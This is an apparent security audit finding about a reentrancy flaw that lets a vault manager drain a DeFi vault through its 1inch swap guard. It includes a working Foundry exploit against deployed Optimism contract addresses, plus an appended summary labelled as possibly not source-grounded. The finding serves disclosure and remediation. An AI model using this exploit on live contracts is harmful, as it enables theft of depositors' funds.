---
id: 22912
severity: "High"
---

# Manager can drain a Vault through reentrancy

## Description

A manager can use the swap function allowed on OneInchV6Guard to drain any Vault by reentering the PoolManagerLogic contract in the middle of the swap and disabling the asset currently being swapped. When a Vault wants to interact with the 1Inch router to swap some tokens, there's a contract guard called OneInchV6Guard that ensures that the Vault only calls some allowed functions with the right parameters. This is done to avoid a manager doing malicious swaps and stealing the user's funds. Within the allowed functions, there's one called swap that takes an argument called executor, which is the address that will be called by the 1Inch router to make the actual swap of tokens. However, if that argument passed is a malicious contract, it could reenter the Vault and disable the token being swapped at the moment, which will pass successfully because at that moment all tokens are in the router contract and none are in the actual Vault. Let's imagine that a Vault is holding various tokens, and most of the value is in WETH, so the manager can steal all by executing the following sequence:  
• The manager deploys a malicious contract, which will later be used to drain the Vault  
• The manager makes that contract the trader of the Vault and triggers the attack.  
– The malicious contract first calls the function execTransaction on the Vault to approve all WETH to the 1Inch router.  
– The malicious contract calls again execTransaction to call the swap function on the 1Inch router, and passing the executor argument as the malicious contract itself.  
– The router transfers all WETH from the Vault to itself.  
– The 1Inch router calls the malicious contract expecting to perform the swap, but it calls the PoolManagerLogic contract to remove the support for WETH token, which will execute because all WETH tokens are currently in the router.  
– After that, the router returns the WETH to the Vault, but it won't be accounted for because the asset is no longer supported.  
After the attack, the Vault will still hold all the WETH, but this won't account for the share value because the WETH token will no longer be supported in the Vault. This means that all the Vault's shares will become mostly worthless because most of the Vault's assets were in WETH, and now it's lost. Finally, the manager can recover this WETH all for himself by executing a swap with almost 100% slippage, by self-sandwiching the transaction. Usually, if a manager wants the Vault to perform a swap, some checks ensure that the slippage cannot be high to protect the user's funds. This is checked at SlippageAccumulator::updateSlippageImpact:  
s/utils/SlippageAccumulator.sol#L89  
```solidity
function updateSlippageImpact(SwapData calldata swapData) external onlyContractGuard(swapData.to) {
    if (IHasSupportedAsset(swapData.poolManagerLogic).isSupportedAsset(swapData.srcAsset)) {
    }
}
```
However, as the code snippet is showing, the slippage of a swap won't be checked if the token being swapped is not supported by the Vault. Using this, a manager can trade all the unaccounted WETH allowing all the slippage, and can sandwich that transaction by extracting the maximum value from that swap. Using the attack paths described above, a manager can completely drain a Vault in a single transaction.

## Proof of Concept

The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_oneInch_PoC --evm-version cancun. Additionally, you must have the following lines in the .env file in order for the test to fork the blockchain:  
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}  
// SPDX-License-Identifier: SEE LICENSE IN LICENSE  
```solidity
pragma solidity 0.8.13;

import {Test} from "forge-std/Test.sol";

interface IAggregationRouterV6 {
    struct SwapDescription {
        address srcToken; // IERC20
        address dstToken; // IERC20
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }
    function swap(
        address sender,
        SwapDescription calldata desc,
        bytes calldata data
    ) external payable returns (uint256 returnAmount);
}

interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IPoolManagerLogic {
    struct Asset {
        address asset;
        bool isDeposit;
    }
    function totalFundValue() external view returns (uint256);
    function changeManager(address newManager, string memory newManagerName) external;
    function manager() external view returns (address);
    function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;
    function setTrader(address _trader) external;
}

contract OneInchTest is Test {
    IAggregationRouterV6 router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121303383); // Jun-12-2024 03:19:03 PM +UTC
    }

    function test_oneInch_PoC() public {
        // First, simulate the pool getting 100 WETH
        deal(address(WETH), address(pool), 100e18);
        assertEq(WETH.balanceOf(address(pool)), 100e18);
        // The Vault is holding ~362,202 USD (mostly the 100 WETH)
        assertEq(manager.totalFundValue(), 362_202.734297348421959993e18);
        // Deploy the trick contract
        TrickContract trick = new TrickContract();
        // Make the trick contract the trader of the pool
        vm.prank(managerAddress);
        manager.setTrader(address(trick));
        // And trigger the attack
        trick.attack();
        // Finally, the Vault has lost the 100 WETH and is now holding ~43 USD
        assertEq(manager.totalFundValue(), 43.964297348421959993e18);
        // The 100 WETH are still in the Vault but are not accounted for
        assertEq(WETH.balanceOf(address(pool)), 100e18);
    }
}

contract TrickContract is Test {
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    IAggregationRouterV6 router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);

    function attack() public {
        // First, craft the transaction to approve 100 weth to 1Inch Aggregator
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(router), 100e18);
        // Execute the transaction
        pool.execTransaction(address(WETH), data);
        assertEq(WETH.allowance(address(pool), address(router)), 100e18);
        // Now, craft the transaction to do the trick swap
        IAggregationRouterV6.SwapDescription memory desc = IAggregationRouterV6.SwapDescription({
            srcToken: address(WETH),
            dstToken: address(WETH),
            srcReceiver: payable(address(router)),
            dstReceiver: payable(address(pool)),
            amount: 100e18,
            minReturnAmount: 100e18,
            flags: 0
        });
        data = abi.encodeWithSelector(router.swap.selector, address(this), desc, "0x0");
        // Execute the transaction
        pool.execTransaction(address(router), data);
    }

    function execute(address) public returns (uint256) {
        // Make sure the pool has no WETH
        assertEq(WETH.balanceOf(address(pool)), 0);
        address[] memory addrs = new address[](1);
        addrs[0] = address(WETH);
        // Remove the WETH from the pool as supported asset
        manager.changeAssets(
            new IPoolManagerLogic.Asset[](0),
            addrs
        );
        return 100e18;
    }
}
```
As the test shows, after the attack the Vault still holds the 100 WETH but these tokens are not accounted for in the total value. This means that the Vault shares will become almost worthless because before they were valued at 362,000 USD and now at 43 USD. Additionally, a manager could now execute a swap with 1Inch allowing the maximum slippage to sandwich that transaction and steal most of the WETH being swapped.

## Recommendation

Honestly, I'm not an expert on 1Inch but the checks for the swap function should be improved in some way to avoid passing any address as the executor. Moreover, it'd be nice to have some checks on the changeAssets function to avoid changing the supported assets in the middle of an external call.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a re‑entrancy and asset‑removal flaw that allows a vault manager to effectively drain the vault by abusing the OneInchV6Guard swap function. The guard permits the vault to call a limited set of functions on the 1inch router, including a swap that receives an executor address. Because the contract does not validate that the executor is a trusted contract, a malicious contract can be supplied as executor. When the manager sets this contract as the vault’s trader and triggers a swap, the router first transfers the source token (e.g., WETH) from the vault to itself. During the callback, the malicious executor calls the PoolManagerLogic.changeAssets function to remove the source token from the list of supported assets while the token balance is temporarily held by the router. After the router returns the tokens to the vault, the vault’s accounting logic no longer recognises the token as supported, so the returned amount is ignored in the total fund value calculation. Consequently the vault’s share price collapses even though the physical token balance remains unchanged. Because the slippage‑impact check in SlippageAccumulator is gated by the isSupportedAsset test, the subsequent swap can be executed with arbitrarily high slippage, allowing the manager to self‑sandwich the transaction and extract almost the entire value of the removed asset. The attack can be performed in a single transaction whenever the manager can set the trader address and the vault relies on the OneInchV6Guard without additional re‑entrancy protection. Users see the expected token balance in the UI but their share value drops dramatically, creating the impression that funds have vanished. The issue was discovered during a security audit through a crafted proof‑of‑concept that forks Optimism and reproduces the full drain. It is hard to notice because the token balance does not change and the vault’s internal accounting silently excludes the asset. The bug belongs to the class of re‑entrancy combined with mutable asset‑registry vulnerabilities and improper input validation. To remediate, the swap function should reject arbitrary executor addresses or enforce that the executor is the router itself, a re‑entrancy guard should be added around changeAssets, and the slippage check should be performed regardless of asset support. Additionally, the protocol should prevent modification of the supported‑asset list during external calls to preserve accounting invariants.
